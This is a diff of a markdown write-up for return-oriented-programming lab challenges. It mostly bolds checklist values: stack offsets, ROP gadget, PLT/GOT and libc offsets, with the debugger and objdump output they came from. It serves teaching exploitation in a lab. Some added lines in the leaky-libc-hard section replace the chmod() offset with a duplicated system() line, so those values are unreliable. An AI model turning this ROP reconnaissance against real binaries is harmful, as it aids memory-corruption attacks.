@@ -4787,9 +4787,9 @@ Unique gadgets found: 89
 - [ ] Location of a NULL terminated string
 - [ ] Locations of required PLT stubs
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401bf5`
-   - `pop rsi ; ret`: `0x401bed`
-   - `pop rdx ; ret`: `0x401bfd`
+   - `pop rdi ; ret`: **`0x401bf5`**
+   - `pop rsi ; ret`: **`0x401bed`**
+   - `pop rdx ; ret`: **`0x401bfd`**
 - [ ] Location to which flag is to be read
 
 As for the invocation of the syscall, even if we cannot directly do it, we can leverage the PLT stubs which are present in the binary.
@@ -4828,13 +4828,13 @@ Non-debugging symbols:
 - [ ] Offset between buffer and stored return address: `88`
 - [ ] Location of a NULL terminated string
 - [x] Locations of required PLT stubs
-   - `open@plt`: `0x401100`
-   - `read@plt`: `0x4010d0`
-   - `puts@plt`: `0x4010b0`
+   - `open@plt`: **`0x401100`**
+   - `read@plt`: **`0x4010d0`**
+   - `puts@plt`: **`0x4010b0`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401bf5`
-   - `pop rsi ; ret`: `0x401bed`
-   - `pop rdx ; ret`: `0x401bfd`
+   - `pop rdi ; ret`: **`0x401bf5`**
+   - `pop rsi ; ret`: **`0x401bed`**
+   - `pop rdx ; ret`: **`0x401bfd`**
 - [ ] Location to which flag is to be read
 
 #### `challenge()`
@@ -4951,18 +4951,18 @@ pwndbg> p/d 0x7ffd745d5fc8 - 0x7ffd745d5f90
 $1: 56
 ```
 
-- [x] Offset between buffer and stored return address: `56`
-   - Buffer address: `0x7ffd745d5f90`
-   - location of the stored return pointer: `0x7ffd745d5fc8`
+- [x] Offset between buffer and stored return address: **`56`**
+   - Buffer address: **`0x7ffd745d5f90`**
+   - location of the stored return pointer: **`0x7ffd745d5fc8`**
 - [ ] Location of a NULL terminated string
 - [x] Locations of required PLT stubs
-   - `open@plt`: `0x401100`
-   - `read@plt`: `0x4010d0`
-   - `puts@plt`: `0x4010b0`
+   - `open@plt`: **`0x401100`**
+   - `read@plt`: **`0x4010d0`**
+   - `puts@plt`: **`0x4010b0`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401bf5`
-   - `pop rsi ; ret`: `0x401bed`
-   - `pop rdx ; ret`: `0x401bfd`
+   - `pop rdi ; ret`: **`0x401bf5`**
+   - `pop rsi ; ret`: **`0x401bed`**
+   - `pop rdx ; ret`: **`0x401bfd`**
 - [ ] Location to which flag is to be read
 
 Let's find a string we can use as a symlink.
@@ -4973,18 +4973,18 @@ hacker@return-oriented-programming~indirect-invocation-hard:/$ objdump -s -j .ro
  402030 2100                                 !.   
 ```
 
-- [x] Offset between buffer and stored return address: `56`
-   - Buffer address: `0x7ffd745d5f90`
-   - location of the stored return pointer: `0x7ffd745d5fc8`
-- [x] Location of a NULL terminated string: `0x402030`
+- [x] Offset between buffer and stored return address: **`56`**
+   - Buffer address: **`0x7ffd745d5f90`**
+   - location of the stored return pointer: **`0x7ffd745d5fc8`**
+- [x] Location of a NULL terminated string: **`0x402030`**
 - [x] Locations of required PLT stubs
-   - `open@plt`: `0x401100`
-   - `read@plt`: `0x4010d0`
-   - `puts@plt`: `0x4010b0`
+   - `open@plt`: **`0x401100`**
+   - `read@plt`: **`0x4010d0`**
+   - `puts@plt`: **`0x4010b0`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401bf5`
-   - `pop rsi ; ret`: `0x401bed`
-   - `pop rdx ; ret`: `0x401bfd`
+   - `pop rdi ; ret`: **`0x401bf5`**
+   - `pop rsi ; ret`: **`0x401bed`**
+   - `pop rdx ; ret`: **`0x401bfd`**
 - [ ] Location to which flag is to be read
 
 Finally, we have to get the address of the `.bss` section so that we can read the flag.
@@ -5023,19 +5023,19 @@ Local exec file:
         0x0000000000404060 - 0x0000000000404080 is .bss
 ```
 
-- [x] Offset between buffer and stored return address: `56`
-   - Buffer address: `0x7ffd745d5f90`
-   - location of the stored return pointer: `0x7ffd745d5fc8`
-- [x] Location of a NULL terminated string: `0x402030`
+- [x] Offset between buffer and stored return address: **`56`**
+   - Buffer address: **`0x7ffd745d5f90`**
+   - location of the stored return pointer: **`0x7ffd745d5fc8`**
+- [x] Location of a NULL terminated string: **`0x402030`**
 - [x] Locations of required PLT stubs
-   - `open@plt`: `0x401100`
-   - `read@plt`: `0x4010d0`
-   - `puts@plt`: `0x4010b0`
+   - `open@plt`: **`0x401100`**
+   - `read@plt`: **`0x4010d0`**
+   - `puts@plt`: **`0x4010b0`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401bf5`
-   - `pop rsi ; ret`: `0x401bed`
-   - `pop rdx ; ret`: `0x401bfd`
-- [x] Location to which flag is to be read: `0x404100`
+   - `pop rdi ; ret`: **`0x401bf5`**
+   - `pop rsi ; ret`: **`0x401bed`**
+   - `pop rdx ; ret`: **`0x401bfd`**
+- [x] Location to which flag is to be read: **`0x404100`**
 
 ### ROP chain: ret2plt
 
@@ -5277,8 +5277,8 @@ Unique gadgets found: 131
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401df3`
-   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+   - `pop rdi ; ret`: **`0x401df3`**
+   - `pop rsi ; pop r15 ; ret`: **`0x401df1`**
 
 As expected, there is no syscall gadget.
 Since the challenge program leaks the address of `system()` within Libc, we can call the necessary the Libc functions directly instead.
@@ -5295,10 +5295,10 @@ hacker@return-oriented-programming~leaky-libc-easy:~$ readelf -s /lib/x86_64-lin
 - [ ] Offset between buffer and stored return address
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `system()` within Libc: **`0x52290`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401df3`
-   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+   - `pop rdi ; ret`: **`0x401df3`**
+   - `pop rsi ; pop r15 ; ret`: **`0x401df1`**
 
 Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.
 
@@ -5313,11 +5313,11 @@ hacker@return-oriented-programming~leaky-libc-easy:~$ readelf -s /lib/x86_64-lin
 - [ ] Offset between buffer and stored return address
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `chmod()` within Libc: **`0x10dd80`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401df3`
-   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+   - `pop rdi ; ret`: **`0x401df3`**
+   - `pop rsi ; pop r15 ; ret`: **`0x401df1`**
 
 #### `challenge()`
 
@@ -5505,16 +5505,16 @@ pwndbg> p/d 0x7ffd64369f38 - 0x7ffd64369ec0
 $1: 120
 ```
 
-- [x] Offset between buffer and stored return address: `120`
-   - Location of the buffer: `0x7ffd64369ec0`
-   - location of the stored return pointer: `0x7ffd64369f38`
+- [x] Offset between buffer and stored return address: **`120`**
+   - Location of the buffer: **`0x7ffd64369ec0`**
+   - location of the stored return pointer: **`0x7ffd64369f38`**
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `chmod()` within Libc: **`0x10dd80`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401df3`
-   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+   - `pop rdi ; ret`: **`0x401df3`**
+   - `pop rsi ; pop r15 ; ret`: **`0x401df1`**
 
 Let's find a string we can use as a symlink.
 
@@ -5549,16 +5549,16 @@ hacker@return-oriented-programming~leaky-libc-easy:/$ objdump -s -j .rodata /cha
  4024b0 6f6f6462 79652100                    oodbye!.  
 ```
 
-- [x] Offset between buffer and stored return address: `120`
-   - Location of the buffer: `0x7ffd64369ec0`
-   - location of the stored return pointer: `0x7ffd64369f38`
-- [x] Location of a NULL terminated string: `0x402491`
+- [x] Offset between buffer and stored return address: **`120`**
+   - Location of the buffer: **`0x7ffd64369ec0`**
+   - location of the stored return pointer: **`0x7ffd64369f38`**
+- [x] Location of a NULL terminated string: **`0x402491`**
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `chmod()` within Libc: **`0x10dd80`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x401df3`
-   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+   - `pop rdi ; ret`: **`0x401df3`**
+   - `pop rsi ; pop r15 ; ret`: **`0x401df1`**
 
 
 ### ROP chain: ret2libc
@@ -5905,8 +5905,8 @@ Unique gadgets found: 79
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x402333`
-   - `pop rsi ; pop r15 ; ret`: `0x402331`
+   - `pop rdi ; ret`: **`0x402333`**
+   - `pop rsi ; pop r15 ; ret`: **`0x402331`**
 
 We can then find the relevant offset within Libc.
 
@@ -5922,10 +5922,10 @@ hacker@return-oriented-programming~leaky-libc-hard:/$ readelf -s /lib/x86_64-lin
 - [ ] Offset between buffer and stored return address
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `system()` within Libc: **`0x52290`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x402333`
-   - `pop rsi ; pop r15 ; ret`: `0x402331`
+   - `pop rdi ; ret`: **`0x402333`**
+   - `pop rsi ; pop r15 ; ret`: **`0x402331`**
 
 Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.
 
@@ -5940,11 +5940,11 @@ hacker@return-oriented-programming~leaky-libc-hard:/$ readelf -s /lib/x86_64-lin
 - [ ] Offset between buffer and stored return address
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `system()` within Libc: **`0x52290`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x402333`
-   - `pop rsi ; pop r15 ; ret`: `0x402331`
+   - `pop rdi ; ret`: **`0x402333`**
+   - `pop rsi ; pop r15 ; ret`: **`0x402331`**
 
 #### `challenge()`
 
@@ -6054,14 +6054,14 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [ ] Offset between buffer and stored return address
-   - Location of the buffer: `0x7ffd039a08b0`
+   - Location of the buffer: **`0x7ffd039a08b0`**
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `system()` within Libc: **`0x52290`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x402333`
-   - `pop rsi ; pop r15 ; ret`: `0x402331`
+   - `pop rdi ; ret`: **`0x402333`**
+   - `pop rsi ; pop r15 ; ret`: **`0x402331`**
 
 Let's find the location of the stored return address.
 
@@ -6077,15 +6077,15 @@ Stack level 0, frame at 0x7ffd039a0900:
 ```
 
 - [ ] Offset between buffer and stored return address
-   - Location of the buffer: `0x7ffd039a08b0`
-   - location of the stored return pointer: `0x7ffd039a08f8`
+   - Location of the buffer: **`0x7ffd039a08b0`**
+   - location of the stored return pointer: **`0x7ffd039a08f8`**
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `system()` within Libc: **`0x52290`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x402333`
-   - `pop rsi ; pop r15 ; ret`: `0x402331`
+   - `pop rdi ; ret`: **`0x402333`**
+   - `pop rsi ; pop r15 ; ret`: **`0x402331`**
 
 We can now calculate the offset between the location of the buffer and the location of the stored return address.
 
@@ -6094,16 +6094,16 @@ pwndbg> p/d 0x7ffd039a08f8 - 0x7ffd039a08b0
 $1: 72
 ```
 
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7ffd039a08b0`
-   - location of the stored return pointer: `0x7ffd039a08f8`
+- [x] Offset between buffer and stored return address: **`72`**
+   - Location of the buffer: **`0x7ffd039a08b0`**
+   - location of the stored return pointer: **`0x7ffd039a08f8`**
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `system()` within Libc: **`0x52290`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x402333`
-   - `pop rsi ; pop r15 ; ret`: `0x402331`
+   - `pop rdi ; ret`: **`0x402333`**
+   - `pop rsi ; pop r15 ; ret`: **`0x402331`**
 
 Finally, we have to fint the location of a relevant NULL terminated string that we can use as a symlink.
 
@@ -6114,16 +6114,16 @@ hacker@return-oriented-programming~leaky-libc-hard:/$ objdump -s -j .rodata /cha
  403060 0a002323 2320476f 6f646279 652100    ..### Goodbye!. 
 ```
 
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7ffd039a08b0`
-   - location of the stored return pointer: `0x7ffd039a08f8`
-- [x] Location of a NULL terminated string: `0x40306d`
+- [x] Offset between buffer and stored return address: **`72`**
+   - Location of the buffer: **`0x7ffd039a08b0`**
+   - location of the stored return pointer: **`0x7ffd039a08f8`**
+- [x] Location of a NULL terminated string: **`0x40306d`**
 - [x] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
-   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `system()` within Libc: **`0x52290`**
+   - Offset of `system()` within Libc: **`0x52290`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x402333`
-   - `pop rsi ; pop r15 ; ret`: `0x402331`
+   - `pop rdi ; ret`: **`0x402333`**
+   - `pop rsi ; pop r15 ; ret`: **`0x402331`**
 
 
 ### ROP chain: ret2libc
@@ -6237,7 +6237,7 @@ hacker@return-oriented-programming~putsception-easy:/$ objdump -d /challenge/put
 ```
 
 - [ ] Offset between buffer and stored return address
-- [x] Location of the PLT entry of `puts@plt`: `0x401110`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401110`**
 - [ ] Location of the GOT entry of `puts@got`
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
@@ -6254,8 +6254,8 @@ hacker@return-oriented-programming~putsception-easy:/$ readelf -r /challenge/put
 ```
 
 - [ ] Offset between buffer and stored return address
-- [x] Location of the PLT entry of `puts@plt`: `0x401110`
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401110`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
@@ -6271,12 +6271,12 @@ Symbol "_start" is at 0x4011b0 in a file compiled without debugging.
 ```
 
 - [ ] Offset between buffer and stored return address
-- [x] Location of the PLT entry of `puts@plt`: `0x401110`
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401110`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4011b0`
+- [x] Address of `_start()`: **`0x4011b0`**
 
 #### `challenge()`
 
@@ -6450,13 +6450,13 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [ ] Offset between buffer and stored return address
-   - Location of the buffer: `0x7fff7f3afc20`
-- [x] Location of the PLT entry of `puts@plt`: `0x401110`
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
+   - Location of the buffer: **`0x7fff7f3afc20`**
+- [x] Location of the PLT entry of `puts@plt`: **`0x401110`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4011b0`
+- [x] Address of `_start()`: **`0x4011b0`**
 
 Let's get the location of the stored return address and calculate the offset.
 
@@ -6477,14 +6477,14 @@ $1: 56
 ```
 
 - [x] Offset between buffer and stored return address: `56`
-   - Location of the buffer: `0x7fff7f3afc20`
+   - Location of the buffer: **`0x7fff7f3afc20`**
    - location of the stored return pointer: `0x7fff7f3afc58`
-- [x] Location of the PLT entry of `puts@plt`: `0x401110`
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401110`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4011b0`
+- [x] Address of `_start()`: **`0x4011b0`**
 
 Let's find a relevant NULL terminated string.
 
@@ -6523,14 +6523,14 @@ hacker@return-oriented-programming~putsception-easy:/$ objdump -s -j .rodata /ch
 ```
 
 - [x] Offset between buffer and stored return address: `56`
-   - Location of the buffer: `0x7fff7f3afc20`
-   - location of the stored return pointer: `0x7fff7f3afc58`
-- [x] Location of the PLT entry of `puts@plt`: `0x401110`
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
+   - Location of the buffer: **`0x7fff7f3afc20`**
+   - location of the stored return pointer: **`0x7fff7f3afc58`**
+- [x] Location of the PLT entry of `puts@plt`: **`0x401110`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
 - [x] Location of a NULL terminated string: `0x403606`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4011b0`
+- [x] Address of `_start()`: **`0x4011b0`**
 
 #### ROP gadgets
 
@@ -6678,17 +6678,17 @@ Gadgets information
 Unique gadgets found: 136
 ```
 
-- [x] Offset between buffer and stored return address: `56`
-   - Location of the buffer: `0x7fff7f3afc20`
-   - location of the stored return pointer: `0x7fff7f3afc58`
-- [x] Location of the PLT entry of `puts@plt`: `0x401110`
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
-- [x] Location of a NULL terminated string: `0x403606`
+- [x] Offset between buffer and stored return address: **`56`**
+   - Location of the buffer: **`0x7fff7f3afc20`**
+   - location of the stored return pointer: **`0x7fff7f3afc58`**
+- [x] Location of the PLT entry of `puts@plt`: **`0x401110`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
+- [x] Location of a NULL terminated string: **`0x403606`**
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x402223`
-   - `pop rsi ; pop r15 ; ret`: `0x402221`
-- [x] Address of `_start()`: `0x4011b0`
+   - `pop rdi ; ret`: **`0x402223`**
+   - `pop rsi ; pop r15 ; ret`: **`0x402221`**
+- [x] Address of `_start()`: **`0x4011b0`**
 
 #### Libc functions
 
@@ -6711,19 +6711,19 @@ hacker@return-oriented-programming~putsception-easy:/$ readelf -s /lib/x86_64-li
   2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Offset between buffer and stored return address: `56`
-   - Location of the buffer: `0x7fff7f3afc20`
-   - location of the stored return pointer: `0x7fff7f3afc58`
-- [x] Location of the PLT entry of `puts@plt`: `0x401110`
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
-- [x] Location of a NULL terminated string: `0x403606`
+- [x] Offset between buffer and stored return address: **`56`**
+   - Location of the buffer: **`0x7fff7f3afc20`**
+   - location of the stored return pointer: **`0x7fff7f3afc58`**
+- [x] Location of the PLT entry of `puts@plt`: **`0x401110`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
+- [x] Location of a NULL terminated string: **`0x403606`**
 - [x] Offsets of required Libc functions
-   - Offset of the `puts` symbol within Libc: `0x84420`
-   - Offset of the `chmod` symbol within Libc: `0x10dd80`
+   - Offset of the `puts` symbol within Libc: **`0x84420`**
+   - Offset of the `chmod` symbol within Libc: **`0x10dd80`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x402223`
-   - `pop rsi ; pop r15 ; ret`: `0x402221`
-- [x] Address of `_start()`: `0x4011b0`
+   - `pop rdi ; ret`: **`0x402223`**
+   - `pop rsi ; pop r15 ; ret`: **`0x402221`**
+- [x] Address of `_start()`: **`0x4011b0`**
 
 ### ROP chain: ret2libc
 
@@ -7198,7 +7198,7 @@ hacker@return-oriented-programming~putsception-hard:/$ objdump -d /challenge/put
 ```
 
 - [ ] Offset between buffer and stored return address
-- [x] Location of the PLT entry of `puts@plt`: `0x401090`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401090`**
 - [ ] Location of the GOT entry of `puts@got`
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
@@ -7213,8 +7213,8 @@ hacker@return-oriented-programming~putsception-hard:/$ readelf -r /challenge/put
 ```
 
 - [ ] Offset between buffer and stored return address
-- [x] Location of the PLT entry of `puts@plt`: `0x401090`
-- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401090`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405020`**
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
@@ -7230,12 +7230,12 @@ Symbol "_start" is at 0x4010d0 in a file compiled without debugging.
 ```
 
 - [ ] Offset between buffer and stored return address
-- [x] Location of the PLT entry of `puts@plt`: `0x401090`
-- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401090`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405020`**
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4010d0`
+- [x] Address of `_start()`: **`0x4010d0`**
 
 #### `challenge()`
 
@@ -7334,13 +7334,13 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [ ] Offset between buffer and stored return address
-   - Location of the buffer: `0x7fff1ca54290`
-- [x] Location of the PLT entry of `puts@plt`: `0x401090`
-- [x] Location of the GOT entry of `puts@got`: `0x405020`
+   - Location of the buffer: **`0x7fff1ca54290`**
+- [x] Location of the PLT entry of `puts@plt`: **`0x401090`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405020`**
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4010d0`
+- [x] Address of `_start()`: **`0x4010d0`**
 
 Now, lets find the location of the stored return address and calculate the offset.
 
@@ -7360,15 +7360,15 @@ pwndbg> p/d 0x7fff1ca542d8 - 0x7fff1ca54290
 $1: 72
 ```
 
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7fff1ca54290`
-   - location of the stored return pointer: `0x7fff1ca542d8`
-- [x] Location of the PLT entry of `puts@plt`: `0x401090`
-- [x] Location of the GOT entry of `puts@got`: `0x405020`
+- [x] Offset between buffer and stored return address: **`72`**
+   - Location of the buffer: **`0x7fff1ca54290`**
+   - location of the stored return pointer: **`0x7fff1ca542d8`**
+- [x] Location of the PLT entry of `puts@plt`: **`0x401090`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405020`**
 - [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4010d0`
+- [x] Address of `_start()`: **`0x4010d0`**
 
 Let's find a relevant NULL terminated string.
 
@@ -7378,15 +7378,15 @@ hacker@return-oriented-programming~putsception-hard:/$ objdump -s -j .rodata /ch
  403030 2100                                 !.  
 ```
 
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7fff1ca54290`
-   - location of the stored return pointer: `0x7fff1ca542d8`
-- [x] Location of the PLT entry of `puts@plt`: `0x401090`
-- [x] Location of the GOT entry of `puts@got`: `0x405020`
-- [x] Location of a NULL terminated string: `0x403030`
+- [x] Offset between buffer and stored return address: **`72`**
+   - Location of the buffer: **`0x7fff1ca54290`**
+   - location of the stored return pointer: **`0x7fff1ca542d8`**
+- [x] Location of the PLT entry of `puts@plt`: **`0x401090`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405020`**
+- [x] Location of a NULL terminated string: **`0x403030`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4010d0`
+- [x] Address of `_start()`: **`0x4010d0`**
 
 #### ROP gadgets
 
@@ -7476,17 +7476,17 @@ Gadgets information
 Unique gadgets found: 78
 ```
 
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7fff1ca54290`
-   - location of the stored return pointer: `0x7fff1ca542d8`
-- [x] Location of the PLT entry of `puts@plt`: `0x401090`
-- [x] Location of the GOT entry of `puts@got`: `0x405020`
-- [x] Location of a NULL terminated string: `0x403030`
+- [x] Offset between buffer and stored return address: **`72`**
+   - Location of the buffer: **`0x7fff1ca54290`**
+   - location of the stored return pointer: **`0x7fff1ca542d8`**
+- [x] Location of the PLT entry of `puts@plt`: **`0x401090`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405020`**
+- [x] Location of a NULL terminated string: **`0x403030`**
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x4022b3`
-   - `pop rsi ; pop r15 ; ret`: `0x4022b1`
-- [x] Address of `_start()`: `0x4010d0`
+   - `pop rdi ; ret`: **`0x4022b3`**
+   - `pop rsi ; pop r15 ; ret`: **`0x4022b1`**
+- [x] Address of `_start()`: **`0x4010d0`**
 
 #### Libc functions
 
@@ -7509,19 +7509,19 @@ hacker@return-oriented-programming~putsception-hard:/$ readelf -s /lib/x86_64-li
   2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7fff1ca54290`
-   - location of the stored return pointer: `0x7fff1ca542d8`
-- [x] Location of the PLT entry of `puts@plt`: `0x401090`
-- [x] Location of the GOT entry of `puts@got`: `0x405020`
-- [x] Location of a NULL terminated string: `0x403030`
+- [x] Offset between buffer and stored return address: **`72`**
+   - Location of the buffer: **`0x7fff1ca54290`**
+   - location of the stored return pointer: **`0x7fff1ca542d8`**
+- [x] Location of the PLT entry of `puts@plt`: **`0x401090`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405020`**
+- [x] Location of a NULL terminated string: **`0x403030`**
 - [x] Offsets of required Libc functions
-    - Offset of the `puts` symbol within Libc: `0x84420`
-    - Offset of the `chmod` symbol within Libc: `0x10dd80`
+    - Offset of the `puts` symbol within Libc: **`0x84420`**
+    - Offset of the `chmod` symbol within Libc: **`0x10dd80`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x4022b3`
-   - `pop rsi ; pop r15 ; ret`: `0x4022b1`
-- [x] Address of `_start()`: `0x4010d0`
+   - `pop rdi ; ret`: **`0x4022b3`**
+   - `pop rsi ; pop r15 ; ret`: **`0x4022b1`**
+- [x] Address of `_start()`: **`0x4010d0`**
 
 ### ROP chain: ret2libc
 
@@ -7717,7 +7717,7 @@ We already know the location in the BSS to which our ROP payload is saved based 
 
 - [ ] Location of the PLT entry of `puts@plt`
 - [ ] Location of the GOT entry of `puts@got`
-- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0 + 16` (Because we do not want to execute the first two gadgets again in the BSS.)
+- [x] Location of the unexecuted ROP chain within BSS: **`0x4150e0 + 16` = `0x4150f0`** (Because we do not want to execute the first two gadgets again in the BSS.)
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 - [ ] Address of `_start()`
@@ -7729,9 +7729,9 @@ hacker@return-oriented-programming~pivotal-prelude-easy:/$ objdump -d /challenge
 0000000000401120 <puts@plt>:
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
+- [x] Location of the PLT entry of `puts@plt`: **`0x401120`**
 - [ ] Location of the GOT entry of `puts@got`
-- [x] Location of the unexecuted ROP chain within BSS: `0x4150f0`
+- [x] Location of the unexecuted ROP chain within BSS: **`0x4150f0`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 - [ ] Address of `_start()`
@@ -7743,9 +7743,9 @@ hacker@return-oriented-programming~pivotal-prelude-easy:/$ readelf -r /challenge
 000000405028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
-- [x] Location of the unexecuted ROP chain within BSS: `0x4150f0`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401120`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
